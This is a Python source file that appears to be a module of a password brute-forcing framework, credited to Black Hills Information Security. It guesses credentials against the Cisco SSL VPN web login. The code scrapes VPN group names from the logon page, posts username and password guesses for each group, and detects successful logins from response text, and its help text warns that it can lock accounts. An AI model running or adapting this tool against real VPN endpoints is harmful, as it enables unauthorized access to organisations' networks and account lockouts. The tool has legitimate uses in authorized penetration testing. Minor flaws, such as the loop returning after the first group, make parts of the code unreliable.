#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
import re
import requests
from bfg.args import http as http_args, argument
from bfg.shortcuts.http import HTTPModule, handleUA, defaultHTTPArgs
from lxml.html import document_fromstring as parse_html

SUCCESS_REGS = [
    re.compile('SSL VPN Service'),
    re.compile('webvpn_logout', re.I),
]
URL_PATH='/+webvpn+/index.html'
GROUPS_PATH='/+CSCOE+/logon.html'

# =================
# MODULE PROPERTIES
# =================

DESCRIPTION = \
'''
Brute force the Cisco SSL VPN web interface.
'''

@argument
def path(name_or_flags=('--path',),
        default=URL_PATH,
        help='Path that is suffixed to the base URL, e.g. '
            'https://somehost.com becomes https://somehost'
            '.com%(default)s. Default: %(default)s'):
    pass

@argument
def groups(name_or_flags=('--groups',),
        nargs='+',
        help='Group values to target. These can usually be found '
            'at the "/+CSCOE+/logon.html" resource by rendering it '
            'and searching for <option> elements in the page\'s '
            'source. Group names or option values can be supplied. '
            'NOTE: Supply "BRUTE_ALL" to this config to target all '
            'groups. BRUTE_ALL COULD LOCK ACCOUNTS!!! '
            'Required: %(required)s'):
    pass

@argument
def groups_path(name_or_flags=('--groups-path',),
        default=GROUPS_PATH,
        help='Path that lists groups in HTML source code. Default: '
         '%(default)s'):
    pass

class Module(HTTPModule):

    brief_description = description = DESCRIPTION

    args = [
            groups(),
            path(),
            groups_path(),
        ] + \
        http_args.getDefaults()

    contributors = [
        dict(
            name='Justin Angel [Module Creator]',
            additional=dict(
                company='Black Hills Information Security',
                twitter='@ImposterKeanu')),
        dict(
            name='Corey Ham',
            additional=dict(
                company='Black Hills Information Security')),
        dict(
            name='Steve Borosh',
            additional=dict(
                company='Black Hills Information Security',
                twitter='@rvrsh3ll')),
    ]

    references = [
        'https://github.com/rapid7/metasploit-framework/blob/47fcf541e' \
        '332e8be7a71ce41738be712a29071ee/modules/auxiliary/scanner/htt' \
        'p/cisco_ssl_vpn.rb#L1'
    ]

    def __post_init__(self, path:str, groups_path:str, groups:list,
            *args, **kwargs):
        '''Set non-standard instance attributes and acquire the groups
        listing from the SSL VPN's landing page.

        Args:
            path: URL path to send credentials to.
            groups_path: URL path where group values are listed.
            groups: A list of group strings to target for brute
                forcing.
        '''

        self.path = path
        self.groups_path = groups_path
        self.groups = groups

        # ============================================
        # REQUEST AND EXTRACT GROUPS FROM LANDING PAGE
        # ============================================

        try:

            resp = requests.get(
                self.url+self.groups_path,
                verify=self.verify_ssl,
                headers=self.headers,
                proxies=self.proxies,
                allow_redirects=False)

        except Exception as e:

            raise Exception(
                'Failed to make initial request to obtain '
                f'a listing of group values: {e}')

        # Parse the response body into an LXML object
        try:
            ele = parse_html(resp.text)
        except Exception as e:
            raise Exception(
                'Failed to parse HTML from initial response: {e}')

        # Query out the group_list
        group_list = ele.get_element_by_id('group_list')
        if not group_list:
            raise Exception(
                'Failed to extract group listing from initial '
                'request.')

        # Gather each option value
        groups = list()
        if self.groups is not None:

            for opt in group_list:
    
                value = opt.get('value')
                text = opt.text
    
                if (opt.tag != 'option') or not (value and text):
                    # Skip non-option/empty elements.
                    continue
    
                if 'BRUTE_ALL' in self.groups:
                    # Capture all groups when "BRUTE_ALL" is supplied.
                    groups.append(value)
    
                elif (text in self.groups) or (value in self.groups):
                    # Capture the value when it's specified.
                    groups.append(value)
    
            self.groups = groups

        else:

            self.groups = groups

    def gen_payload(self, username:str, password:str,
            group:str=None) -> dict:
        '''Generate the standard POST payload for the request.

        Args:
            username: Username value.
            password: Pasword value.
            group: Group to target.

        Returns:
            dict POST payload.
        '''

        payload = dict(
            tgroup='',
            next='',
            tgcookieset='',
            password=password,
            username=username,
            Login='Logon')

        if group:
            payload['groups_list'] = group

        return payload

    def send_and_check(self, username:str, password:str,
            group:str=None) -> dict:
        '''Send the request and validate the response.

        Args:
            username: Username value.
            password: Password value.
            group: Group to target.

        Returns:
            dict outcome structure.
        '''

        # =============================
        # BUILD SESSION AND GET COOKIES
        # =============================

        session = requests.Session()
        session.get(self.url,
            headers=self.headers,
            verify=self.verify_ssl,
            allow_redirects=False,
            proxies=self.proxies)

        # ===================================
        # CHECK FOR SUCCESSFUL AUTHENTICATION
        # ===================================
    
        # make the request
        resp = session.post(self.url+self.path,
                data=self.gen_payload(
                    username=username,
                    password=password,
                    group=group),
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=self.allow_redirects,
                proxies=self.proxies)

        # Output from execution
        out = dict(
            outcome=0,
            username=username,
            password=password)

        # verify credentials and return outcome
        if resp.status_code == 200 and \
                SUCCESS_REGS[0].search(resp.text) and \
                SUCCESS_REGS[1].search(resp.text):
            out['outcome'] = 1

        return out

    @handleUA
    def __call__(self, username, password, *args, **kwargs):
        '''Call the module.
        '''

        try:

            if not self.groups:
    
                # =====================
                # GUESS WITHOUT A GROUP
                # =====================
    
                return self.send_and_check(username, password)
    
            else:

                # ====================
                # GUESS FOR EACH GROUP
                # ====================
    
                for group in self.groups:
    
                    out = self.send_and_check(username, password, group)
    
                    if out['outcome'] == 1:

                        # Add a log event communicating the group
                        # since the database doesn't have a field
                        # have a field to track that value
                        out['events'] = [
                            (
                                'Valid (<username>:<group>:<password>): '
                                f'{username}:{group}:{password}'
                            )
                        ]
    
                        # Return when successful authentication occurs
                        return out

                    return out

        except Exception as e:

            return dict(
                outcome=-1, username=username, password=password,
                events=[str(e)])

